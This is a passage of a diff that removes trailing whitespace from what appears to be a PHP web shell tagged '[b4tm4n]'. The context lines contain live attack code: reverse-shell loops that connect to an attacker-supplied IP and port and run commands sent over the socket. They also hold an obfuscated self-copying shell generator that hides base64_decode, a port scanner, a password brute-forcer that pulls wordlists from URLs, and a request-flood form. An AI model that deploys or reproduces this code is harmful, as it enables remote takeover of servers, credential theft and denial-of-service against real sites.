 							<div id='connect-result'>Terminal: %s",
-							remote_addr,Execute('whoami') 
+							remote_addr,Execute('whoami')
 		);
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="reverse-connect")
@@ -2333,7 +2333,7 @@ if(any("x",$_REQUEST))
 				}
 				else
 				{
-					while(!feof($sock)) 
+					while(!feof($sock))
 				    {
 				    	fwrite($sock,"[b4tm4n]:");
 				        $command=fgets($sock,1024);
@@ -2360,7 +2360,7 @@ if(any("x",$_REQUEST))
 				}
 				else
 				{
-					while(!@socket_connect($sock,$host,$port)) 
+					while(!@socket_connect($sock,$host,$port))
 					{
 					    @socket_write($sock,"[b4tm4n]:",strlen ("[b4tm4n]:"));
 					    $input=@socket_read($sock,1024,PHP_NORMAL_READ);
@@ -2382,14 +2382,14 @@ if(any("x",$_REQUEST))
 				$host=$_REQUEST['reverse-ip'];
 				$port=$_REQUEST['reverse-port'];
 				$sock=@stream_socket_client("tcp://$host:$port",$errno,$errstr);
-				if (!$sock) 
-				{ 
+				if (!$sock)
+				{
 				    printf("<font color='red'><b>%s</b>:%s</font>",$errno,$errstr);
 				}
-				else 
-				{ 
-					while(!feof($sock)) 
-				    { 
+				else
+				{
+					while(!feof($sock))
+				    {
 				    	fwrite($sock,"[b4tm4n]:");
 				        $command=fgets($sock,1024);
 				        if(trim($command)=='quit'||trim($command)=='exit')
@@ -2435,7 +2435,7 @@ if(any("x",$_REQUEST))
 			</div>",implode($php_ini,"\n"),implode($htaccess,"\n"));
 	}
 	if($_REQUEST['x']=="php")
-	{	
+	{
 		$exp=array(
 			"print_r(get_extension_funcs('Core'));",
 			"print_r(get_loaded_extensions());",
@@ -2444,7 +2444,7 @@ if(any("x",$_REQUEST))
 			"print_r(get_defined_constants());",
 			"print_r(get_defined_functions());",
 			"print_r(get_declared_classes());");
-		
+
 		printf("<div id='php'>
 					<form onsubmit='return false;'>
 						<div class='php-left'>
@@ -2503,7 +2503,7 @@ if(any("x",$_REQUEST))
 				$path_perl="C:\\xampp\perl\bin\perl.exe";
 			}
 		}
-		
+
 		$script=array(
 			"#!$path_perl",
 			"use strict;",
@@ -2546,7 +2546,7 @@ if(any("x",$_REQUEST))
 
 		$redirect=GetUrlFromPath($file);
 		printf("Tested -> <a href='$redirect' target='_blank'><u>Link</u></a>");
-		
+
 		if (class_exists('Perl'))
 		{
 			//$perl=Perl::getInstance();
@@ -2592,7 +2592,7 @@ if(any("x",$_REQUEST))
 									'&message='+document.getElementById('email-message').value+
 									'&attachment='+document.getElementById('email-attachment').value);
 
-							\"/>	
+							\"/>
 						</form>
 					</fieldset>
 				</div>
@@ -2658,7 +2658,7 @@ if(any("x",$_REQUEST))
 			{
 				print "Email Send";
 			}
-			else 
+			else
 			{
 				$error=error_get_last();
 				print "Error :" . $error['message'];
@@ -2768,7 +2768,7 @@ if(any("x",$_REQUEST))
 		$row="";
 		$count_dirs=0;
 		$count_files=0;
-		
+
 		foreach($files as $file)
 		{
 			if(is_dir(urld($file)))
@@ -2910,7 +2910,7 @@ if(any("x",$_REQUEST))
 				{
 					$zip=new ZipArchive;
 
-					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE) 
+					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE)
 					{
 						foreach($files as $file)
 						{
@@ -2920,10 +2920,10 @@ if(any("x",$_REQUEST))
 
 								$recur=new RecursiveIteratorIterator(
 								    new RecursiveDirectoryIterator($file),
-								    RecursiveIteratorIterator::LEAVES_ONLY 
+								    RecursiveIteratorIterator::LEAVES_ONLY
 								);
 
-								foreach ($recur as $key => $val) 
+								foreach ($recur as $key => $val)
 								{
 								    if(basename($key)!="..")
 									{
@@ -2949,7 +2949,7 @@ if(any("x",$_REQUEST))
 					    $zip->close();
 					    print 'Zip Created';
 					}
-					else 
+					else
 					{
 					    print 'Failed';
 					}
@@ -2969,23 +2969,23 @@ if(any("x",$_REQUEST))
 						if(pathinfo($newloc)['extension']=='zip')
 						{
 							$zip=new ZipArchive;
-					
-							if ($zip->open($file)===TRUE) 
+
+							if ($zip->open($file)===TRUE)
 							{
 							    $zip->extractTo($newloc);
 							    $zip->close();
 							    $succ++;
 							}
-							else 
+							else
 							{
 							    $fail++;
 							}
 						}
-						else 
+						else
 						{
 						    $fail++;
 						}
-						
+
 					}
 					print "Success: $succ | Failed: $fail";
 				}
@@ -3000,7 +3000,7 @@ if(any("x",$_REQUEST))
 	{
 		$recur=new RecursiveIteratorIterator(
 		    new RecursiveDirectoryIterator($dir),
-		    RecursiveIteratorIterator::LEAVES_ONLY 
+		    RecursiveIteratorIterator::LEAVES_ONLY
 		);
 
 		if(any('find-value',$_REQUEST)&&!empty($_REQUEST['find-value']))
@@ -3008,11 +3008,11 @@ if(any("x",$_REQUEST))
 			$result="";
 			$res_=0;
 
-			foreach ($recur as $key => $val) 
+			foreach ($recur as $key => $val)
 			{
 				if(basename($key)!="..")
 				{
-					if(strpos(realpath($key),$_REQUEST['find-value'])!== false) 
+					if(strpos(realpath($key),$_REQUEST['find-value'])!== false)
 					{
 						$result.=sprintf("<tr>
 								<td></td>
@@ -3037,7 +3037,7 @@ if(any("x",$_REQUEST))
 			printf("
 					<form class='new' method=POST action='?x=find'>
 						<input type='text' name='find-value' id='find-action' value='%s'/><input type='submit' name='find-button' value='Find'/>
-						<label style='margin-left:10px'><font class='on'>Find: '%s' | Found's: %s</font></label>	
+						<label style='margin-left:10px'><font class='on'>Find: '%s' | Found's: %s</font></label>
 					</form>
 					<div class='auto-number'>
 						<table class='table sortable'>
@@ -3117,7 +3117,7 @@ if(any("x",$_REQUEST))
 				'strrev("ed"."oce"."d_4"."6es"."ab")',
 				'strrev("e"."doc"."ed_"."46e"."sab")',
 				'"b"."as"."e6"."4_"."d"."ec"."o"."de"',
-				'"ba"."se"."6"."4_d"."e"."cod"."e"' 
+				'"ba"."se"."6"."4_d"."e"."cod"."e"'
 			);
 			$rand_b64=array_rand($b64);
 			$rand3=$b64[$rand_b64];
@@ -3129,7 +3129,7 @@ if(any("x",$_REQUEST))
 			);
 			$rand_var=array_rand($var);
 			$rand4=$var[$rand_var];
-			$self=preg_replace("/\\\$x_/",$rand,$temp); // Change Variable $x_ to Random 
+			$self=preg_replace("/\\\$x_/",$rand,$temp); // Change Variable $x_ to Random
 			$src_='';
 			$src_.='<?php ';
 			$src_.=$rand4;
@@ -3199,7 +3199,7 @@ if(any("z",$_REQUEST))
 			ob_clean();
 			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname(http_host);
 			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
-			if($_REQUEST['ip']==gethostbyname(http_host)) 
+			if($_REQUEST['ip']==gethostbyname(http_host))
 			{
 				$url=B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=");
 				$geoip=GetUrlContent($url);
@@ -3286,12 +3286,12 @@ if(any("z",$_REQUEST))
 				case '1':
 					if(function_exists('socket_create'))
 					{
-						$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP); 
+						$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP);
 						for($conn_port=$from;$conn_port <=$to;$conn_port++)
 						{
 							$conn=@socket_connect($socket ,$host,$conn_port);
-							if($conn) 
-							{ 
+							if($conn)
+							{
 								print "<br>port $conn_port open";
 								socket_close($socket);
 								$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP);
@@ -3331,11 +3331,11 @@ if(any("z",$_REQUEST))
 
 		$recur=new RecursiveIteratorIterator(
 		    new RecursiveDirectoryIterator($path),
-		    RecursiveIteratorIterator::LEAVES_ONLY 
+		    RecursiveIteratorIterator::LEAVES_ONLY
 		);
 
 		$result="";
-		foreach ($recur as $key => $val) 
+		foreach ($recur as $key => $val)
 		{
 			if(basename($key)!=".."&&basename($key)!=".")
 			{
@@ -3504,7 +3504,7 @@ if(any("z",$_REQUEST))
 
 		function chr_asc($str){
 			$asc='';
-			for($i=0;$i<strlen($str);$i++) 
+			for($i=0;$i<strlen($str);$i++)
 				$asc.=ord($str{$i}).' ';
 			return rtrim($asc);
 		}
@@ -3523,14 +3523,14 @@ if(any("z",$_REQUEST))
 
 		function asc_hex($asc){
 			$hex='';
-			for ($i=0;$i<strlen($asc);$i++) 
+			for ($i=0;$i<strlen($asc);$i++)
 				$hex.=sprintf("%02x",ord(substr($asc,$i,1)));
 			return $hex;
 		}
 
 		function hex_asc($hex){
 			$asc='';
-			for ($i=0;$i<strlen($hex);$i+=2) 
+			for ($i=0;$i<strlen($hex);$i+=2)
 				$asc.=chr(hexdec(substr($hex,$i,2)));
 			return $asc;
 		}
@@ -3554,11 +3554,11 @@ if(any("z",$_REQUEST))
 			return hex_bin($hex);
 		}
 
-		function bin_asc($bin){ 
+		function bin_asc($bin){
 		    $hex=bin_hex($bin);
 			return hex_asc($hex);
 		}
-		
+
 		if(any("opt",$_REQUEST))
 		{
 			ob_clean();
@@ -3735,12 +3735,12 @@ if(any("z",$_REQUEST))
 			ob_clean();
 			$url=$_REQUEST['url'];
 			$user=$_REQUEST['user'];
-			$file=GetUrlExists($_REQUEST['passlist'])? 
-			GetUrlContent($_REQUEST['passlist']): 
+			$file=GetUrlExists($_REQUEST['passlist'])?
+			GetUrlContent($_REQUEST['passlist']):
 			$_REQUEST['passlist'];
 			$words=explode("\n",$file);
 			$length=count($words);
-			foreach ($words as $index => $word) 
+			foreach ($words as $index => $word)
 			{
 				$parameter=http_build_query(
 					array(
@@ -3761,7 +3761,7 @@ if(any("z",$_REQUEST))
 				$st=curl_getinfo($ch,CURLINFO_HTTP_CODE);
 				if(curl_error($ch)) echo curl_error($ch);
 				curl_close($ch);
-				if ($st==200) 
+				if ($st==200)
 				{
 					echo "FOUND'S: $user:$word<br>";
 					exit;
@@ -3932,13 +3932,13 @@ if(any("z",$_REQUEST))
 					<input type="checkbox" id="referer" name="referer" style="vertical-align:middle"> Referer  Target
 					<input type="checkbox" id="origin" name="origin" style="vertical-align:middle"> Origin<br>
 					<label style="margin:5px 0px 5px">
-						Time <span id="times">00:00:00</span> | 
-						Start <span id="start">00:00:00</span> | 
+						Time <span id="times">00:00:00</span> |
+						Start <span id="start">00:00:00</span> |
 						Finish <span id="finish">00:00:00</span>
 					</label><br>
 					<label style="margin:0px 0px 5px">
-						Requests <span id="requests">0</span> | 
-						Proccess <span id="proccess">0</span> | 
+						Requests <span id="requests">0</span> |
+						Proccess <span id="proccess">0</span> |
 						Success <span id="success">0</span>
 					</label><br>
 					<input type="submit" id="attack" value="Start"/>
